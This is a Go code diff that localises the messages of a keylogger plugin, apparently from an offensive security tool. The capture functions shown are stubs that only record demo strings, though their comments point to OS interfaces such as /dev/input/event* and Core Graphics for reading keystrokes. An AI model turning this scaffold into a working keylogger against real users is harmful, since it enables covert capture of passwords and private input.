@@ -46,13 +46,13 @@ func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, sessi
 		outputFile = "keylog.txt"
 	}
 
-	output.WriteString("=== 键盘记录 ===\n")
-	output.WriteString(fmt.Sprintf("输出文件: %s\n", outputFile))
-	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))
+	output.WriteString(i18n.GetText("keylogger_header") + "\n")
+	output.WriteString(i18n.Tr("local_output_file", outputFile) + "\n")
+	output.WriteString(i18n.Tr("local_platform", runtime.GOOS) + "\n\n")
 
 	// 检查输出文件权限
 	if err := p.checkOutputFilePermissions(outputFile); err != nil {
-		output.WriteString(fmt.Sprintf("输出文件权限检查失败: %v\n", err))
+		output.WriteString(i18n.Tr("keylogger_output_permission_failed", err) + "\n")
 		return &plugins.Result{
 			Success: false,
 			Output:  output.String(),
@@ -62,7 +62,7 @@ func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, sessi
 
 	// 检查平台要求
 	if err := p.checkPlatformRequirements(); err != nil {
-		output.WriteString(fmt.Sprintf("平台要求检查失败: %v\n", err))
+		output.WriteString(i18n.Tr("platform_requirement_failed", err) + "\n")
 		return &plugins.Result{
 			Success: false,
 			Output:  output.String(),
@@ -73,7 +73,7 @@ func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, sessi
 	// 启动键盘记录
 	err := p.startKeylogging(ctx, outputFile)
 	if err != nil {
-		output.WriteString(fmt.Sprintf("键盘记录失败: %v\n", err))
+		output.WriteString(i18n.Tr("keylogger_failed", err) + "\n")
 		return &plugins.Result{
 			Success: false,
 			Output:  output.String(),
@@ -82,9 +82,9 @@ func (p *KeyloggerPlugin) Scan(ctx context.Context, info *common.HostInfo, sessi
 	}
 
 	// 输出结果
-	output.WriteString("✓ 键盘记录已完成\n")
-	output.WriteString(fmt.Sprintf("捕获事件数: %d\n", len(p.keyBuffer)))
-	output.WriteString(fmt.Sprintf("日志文件: %s\n", outputFile))
+	output.WriteString(i18n.GetText("keylogger_done") + "\n")
+	output.WriteString(i18n.Tr("keylogger_event_count", len(p.keyBuffer)) + "\n")
+	output.WriteString(i18n.Tr("keylogger_log_file", outputFile) + "\n")
 
 	common.LogSuccess(i18n.Tr("keylogger_success", len(p.keyBuffer)))
 
@@ -109,11 +109,11 @@ func (p *KeyloggerPlugin) startKeylogging(ctx context.Context, outputFile string
 	case "darwin":
 		err = p.startDarwinKeylogging(ctx)
 	default:
-		err = fmt.Errorf("不支持的平台: %s", runtime.GOOS)
+		err = fmt.Errorf("%s", i18n.Tr("unsupported_platform", runtime.GOOS))
 	}
 
 	if err != nil {
-		return fmt.Errorf("键盘记录失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("keylogger_failed_plain"), err)
 	}
 
 	// 保存到文件
@@ -128,7 +128,7 @@ func (p *KeyloggerPlugin) startKeylogging(ctx context.Context, outputFile string
 func (p *KeyloggerPlugin) checkOutputFilePermissions(outputFile string) error {
 	file, err := os.OpenFile(outputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
 	if err != nil {
-		return fmt.Errorf("无法创建输出文件 %s: %w", outputFile, err)
+		return fmt.Errorf("%s: %w", i18n.Tr("output_file_create_failed", outputFile), err)
 	}
 	_ = file.Close()
 	return nil
@@ -144,7 +144,7 @@ func (p *KeyloggerPlugin) checkPlatformRequirements() error {
 	case "darwin":
 		return p.checkDarwinRequirements()
 	default:
-		return fmt.Errorf("不支持的平台: %s", runtime.GOOS)
+		return fmt.Errorf("%s", i18n.Tr("unsupported_platform", runtime.GOOS))
 	}
 }
 
@@ -170,25 +170,25 @@ func (p *KeyloggerPlugin) saveKeysToFile(outputFile string) error {
 
 	file, err := os.OpenFile(outputFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
 	if err != nil {
-		return fmt.Errorf("无法打开输出文件: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("output_file_open_failed"), err)
 	}
 	defer func() { _ = file.Close() }()
 
 	// 写入头部信息
-	header := "=== 键盘记录日志 ===\n"
-	header += fmt.Sprintf("开始时间: %s\n", time.Now().Format("2006-01-02 15:04:05"))
-	header += fmt.Sprintf("平台: %s\n", runtime.GOOS)
-	header += fmt.Sprintf("捕获事件数: %d\n", len(p.keyBuffer))
+	header := i18n.GetText("keylogger_log_header") + "\n"
+	header += i18n.Tr("local_start_time", time.Now().Format("2006-01-02 15:04:05")) + "\n"
+	header += i18n.Tr("local_platform", runtime.GOOS) + "\n"
+	header += i18n.Tr("keylogger_event_count", len(p.keyBuffer)) + "\n"
 	header += "========================\n\n"
 
 	if _, err := file.WriteString(header); err != nil {
-		return fmt.Errorf("写入头部信息失败: %w", err)
+		return fmt.Errorf("%s: %w", i18n.GetText("keylogger_header_write_failed"), err)
 	}
 
 	// 写入键盘记录
 	for _, entry := range p.keyBuffer {
 		if _, err := file.WriteString(entry + "\n"); err != nil {
-			return fmt.Errorf("写入键盘记录失败: %w", err)
+			return fmt.Errorf("%s: %w", i18n.GetText("keylogger_entry_write_failed"), err)
 		}
 	}
 
@@ -199,7 +199,7 @@ func (p *KeyloggerPlugin) saveKeysToFile(outputFile string) error {
 func (p *KeyloggerPlugin) startWindowsKeylogging(ctx context.Context) error {
 	// Windows平台键盘记录实现
 	// 在实际实现中需要使用Windows API
-	p.addKeyToBuffer("演示键盘记录 - Windows平台")
+	p.addKeyToBuffer(i18n.GetText("keylogger_demo_windows"))
 
 	// 模拟记录一段时间
 	select {
@@ -215,7 +215,7 @@ func (p *KeyloggerPlugin) startWindowsKeylogging(ctx context.Context) error {
 func (p *KeyloggerPlugin) startLinuxKeylogging(ctx context.Context) error {
 	// Linux平台键盘记录实现
 	// 在实际实现中需要访问/dev/input/event*设备
-	p.addKeyToBuffer("演示键盘记录 - Linux平台")
+	p.addKeyToBuffer(i18n.GetText("keylogger_demo_linux"))
 
 	// 模拟记录一段时间
 	select {
@@ -231,7 +231,7 @@ func (p *KeyloggerPlugin) startLinuxKeylogging(ctx context.Context) error {
 func (p *KeyloggerPlugin) startDarwinKeylogging(ctx context.Context) error {
 	// macOS平台键盘记录实现
 	// 在实际实现中需要使用Core Graphics框架
-	p.addKeyToBuffer("演示键盘记录 - macOS平台")
+	p.addKeyToBuffer(i18n.GetText("keylogger_demo_darwin"))
 
 	// 模拟记录一段时间
 	select {
